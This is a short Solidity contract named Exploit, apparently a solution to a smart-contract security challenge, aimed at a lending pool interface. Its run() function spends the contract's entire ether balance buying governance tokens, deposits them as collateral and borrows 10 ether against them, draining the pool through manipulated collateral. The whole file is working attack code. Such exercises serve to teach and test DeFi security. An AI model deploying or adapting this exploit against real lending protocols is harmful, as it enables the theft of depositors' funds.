// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

interface ILendPool {
    function buyGov() external payable;
    function govOf(address) external view returns (uint);
    function depositCollateral(uint amount) external;
    function borrow(uint amount) external;
}

contract Exploit {
    ILendPool pool;

    constructor(address target) payable {
        pool = ILendPool(target);
    }

    function run() external {
        pool.buyGov{value: address(this).balance}();
        uint g = pool.govOf(address(this));
        pool.depositCollateral(g);
        pool.borrow(10 ether);
    }

    receive() external payable {}
}
